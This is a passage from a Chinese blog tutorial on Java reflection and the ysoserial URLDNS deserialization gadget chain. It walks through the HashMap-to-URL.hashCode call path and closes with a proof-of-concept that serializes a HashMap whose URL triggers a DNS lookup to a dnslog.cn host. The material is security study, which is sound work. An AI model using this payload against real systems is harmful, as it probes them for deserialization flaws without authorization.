cls.getDeclaredField(<span class="string">&quot;phoneNum&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射，解除私有限定</span></span><br><span class="line">        f.set(obj, <span class="string">&quot;18888889999&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;验证电话：&quot;</span> + U);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Java-lang-reflect-Method"><a href="#Java-lang-reflect-Method" class="headerlink" title="Java.lang.reflect.Method;"></a>Java.lang.reflect.Method;</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span>getMethod(<span class="string">&quot;方法名&quot;</span>,方法的参数类型) 返回一个Method对象</span><br><span class="line">如果是私有方法使用getDeclaredMethod</span><br><span class="line"><span class="title function_">invoke</span><span class="params">(obj，<span class="string">&quot;args1&quot;</span>,<span class="string">&quot;args2&quot;</span>...)</span> 并且可以有返回值</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Methods</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取所有的方法，包括私有的</span></span><br><span class="line">       Method[] methodArray = cls.getDeclaredMethods();</span><br><span class="line">       <span class="keyword">for</span>(Method m : methodArray)&#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;show1&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化一个Student对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor().newInstance();</span><br><span class="line">        m.invoke(obj, <span class="string">&quot;刘德华&quot;</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        m = cls.getDeclaredMethod(<span class="string">&quot;show4&quot;</span>, <span class="type">int</span>.class);<span class="comment">//获取私有的方法</span></span><br><span class="line"></span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);<span class="comment">//解除私有限定</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> m.invoke(obj, <span class="number">20</span>);<span class="comment">//需要两个参数，一个是要调用的对象（获取有反射），一个是实参</span></span><br><span class="line">        System.out.println(<span class="string">&quot;返回值：&quot;</span> + result);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="反射main方法："><a href="#反射main方法：" class="headerlink" title="反射main方法："></a>反射main方法：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fanshe.main;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;main方法执行了。。。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fanshe.main;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Student类的main方法、不要与当前的main方法搞混了</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//1、获取Student对象的字节码</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;fanshe.main.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、获取main方法</span></span><br><span class="line"> <span class="type">Method</span> <span class="variable">methodMain</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;main&quot;</span>, String[].class);<span class="comment">//第一个参数：方法名称，第二个参数：方法形参的类型，</span></span><br><span class="line"><span class="comment">//3、调用main方法</span></span><br><span class="line"><span class="comment">// methodMain.invoke(null, new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125;);</span></span><br><span class="line"> <span class="comment">//第一个参数，对象类型，因为方法是static静态的，所以为null可以，第二个参数是String数组，这里要注意在jdk1.4时是数组，jdk1.5之后是可变参数</span></span><br><span class="line"> <span class="comment">//这里拆的时候将  new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125; 拆成3个对象。。。所以需要将它强转。</span></span><br><span class="line"> methodMain.invoke(<span class="literal">null</span>, (Object)<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>&#125;);<span class="comment">//方式一</span></span><br><span class="line"><span class="comment">// methodMain.invoke(null, new Object[]&#123;new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125;&#125;);//方式二</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用反射创建数值"><a href="#利用反射创建数值" class="headerlink" title="利用反射创建数值"></a>利用反射创建数值</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testArray</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">array</span> <span class="operator">=</span> Array.newInstance(cls,<span class="number">25</span>);</span><br><span class="line">        <span class="comment">//往数组里添加内容</span></span><br><span class="line">        Array.set(array,<span class="number">0</span>,<span class="string">&quot;golang&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">1</span>,<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">2</span>,<span class="string">&quot;pytho&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">3</span>,<span class="string">&quot;Scala&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">4</span>,<span class="string">&quot;Clojure&quot;</span>);</span><br><span class="line">        <span class="comment">//获取某一项的内容</span></span><br><span class="line">        System.out.println(Array.get(array,<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="反射修改被final关键字修饰的成员变量"><a href="#反射修改被final关键字修饰的成员变量" class="headerlink" title="反射修改被final关键字修饰的成员变量"></a>反射修改被<code>final</code>关键字修饰的成员变量</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射获取Field类的modifiers</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置modifiers修改权限</span></span><br><span class="line">modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成员变量的Field对象的modifiers值</span></span><br><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成员变量值</span></span><br><span class="line">field.set(类实例对象, 修改后的值);</span><br></pre></td></tr></table></figure><p>因此我们这里给一个具体实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;bcell.Test&quot;</span>);</span><br><span class="line"><span class="type">Test</span> <span class="variable">Test</span> <span class="operator">=</span> (Test) aClass.newInstance();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;TEST&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">modifiers.setInt(field,field.getModifiers()&amp;~Modifier.FINAL);<span class="comment">//fianl标志位置0</span></span><br><span class="line">field.set(Test,<span class="string">&quot;wocao&quot;</span>);</span><br><span class="line">System.out.println(field.get(Test));</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>但是虽然这么多，其中较为重要的⽅法：</p><p>获取类的⽅法： forName</p><p>实例化类对象的⽅法： newInstance</p><p>获取函数的⽅法： getMethod</p><p>执⾏函数的⽅法： invoke</p><h1 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h1><p><code>URLDNS</code>是<code>ysoserial</code>中的一条利用链，通常用于检测是否存在<code>Java</code>反序列化漏洞</p><p>[1] URLDNS 利用链只能发起 DNS 请求，并不能进行其它利用</p><p>[2] 不限制 jdk 版本，使用 Java 内置类，对第三方依赖没有要求 </p><p>[3] 目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><blockquote><p><code>java.util.HashMap</code>实现了<code>Serializable</code>接口，重写了<code>readObject</code>, 在反序列化时会调用<code>hash</code>函数计算<code>key</code>的<code>hashCode</code>，而<code>java.net.URL</code>的<code>hashCode</code>在计算时会调用<code>getHostAddress</code>来解析域名, 从而发出<code>DNS</code>请求</p></blockquote><h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><blockquote><p>这里跟着<code>ysoserial</code>项目中<code>URLDNS</code>的<code>Gadget</code>来分析</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">    HashMap.hash()</span><br><span class="line">    URL.hashCode()</span><br></pre></td></tr></table></figure><h2 id="0x01-HashMap-readObject"><a href="#0x01-HashMap-readObject" class="headerlink" title="0x01  HashMap.readObject()"></a>0x01  HashMap.readObject()</h2><p>首先 HashMap.readObject()可以被反序列化</p><img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/image-20230322202903247.png" class="" title="image-20230322202903247"><h2 id="0x02putval"><a href="#0x02putval" class="headerlink" title="0x02putval()"></a>0x02putval()</h2><p>查看readObject，这里通过<code>for</code>循环来将<code>HashMap</code>中存储的<code>key</code>通过<code>K key = (K) s.readObject();</code>来进行反序列化，在这之后调用<code>putVal()</code>和<code>hash()</code>函数</p><img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/image-20230322203334018.png" class="" title="image-20230322203334018"><h2 id="0x03hash"><a href="#0x03hash" class="headerlink" title="0x03hash()"></a>0x03hash()</h2><p>来到hash()函数,当<code>key!=null</code>时会调用<code>hashCode()</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">      <span class="type">int</span> h;</span><br><span class="line">      <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04hashCode"><a href="#0x04hashCode" class="headerlink" title="0x04hashCode()"></a>0x04hashCode()</h2><p>跟进<code>hashCode()</code>函数，由于在<code>ysoserial</code>中的<code>URLDNS</code>是利用<code>URL</code>对象，于是跟进<code>Java</code>基本类<code>URL</code>中关于<code>hashCode()</code>的部分<code>java/net/URL.java</code>，由于<code>hashCode</code>的值默认为<code>-1</code>，因此会执行<code>hashCode = handler.hashCode(this)</code>;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x05URLStreamHandler"><a href="#0x05URLStreamHandler" class="headerlink" title="0x05URLStreamHandler"></a>0x05URLStreamHandler</h2><p>调试跟进<code>java/net/URLStreamHandler.java</code>中的<code>hashCode()</code>函数，可以看到这里调用了一个函数<code>getHostAddress()</code>来进行<code>DNS</code>解析返回对应的<code>IP</code></p><img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/image-20230322205310959.png" class="" title="image-20230322205310959"><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Date</span> <span class="variable">nowTime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://lttx9f.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);  <span class="comment">// 绕过Java语言权限控制检查的权限</span></span><br><span class="line">        filed.set(url, <span class="number">209</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">209</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间为: &quot;</span> + simpleDateFormat.format(nowTime));</span><br><span class="line">        filed.set(url, -<span class="number">1</span>); <span class="comment">//本地编译中不进行DNS解析</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./dnsser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(hashmap);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./dnsser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/a745233700/article/details/82893076">(140条消息) Java基础篇：反射机制详解_张维鹏的博客-CSDN博客</a></p><p><a href="https://www.freebuf.com/articles/web/327710.html">Java安全学习—URLDNS链 - FreeBuf网络安全行业门户</a></p><p><a href="https://songly.blog.csdn.net/article/details/118555444?spm=1001.2014.3001.5502">(119条消息) 2-java安全基础——动态类加载（反射）_反射动态加载类_songly_的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、什么是反射：&quot;&gt;&lt;a href=&quot;#一、什么是反射：&quot; class=&quot;headerlink&quot; title=&quot;一、什么是反射：&quot;&gt;&lt;/a&gt;一、什么是反射：&lt;/h1&gt;&lt;p&gt;（1）Java反射机制的核心是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属</summary>
      
    
    
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
</feed>
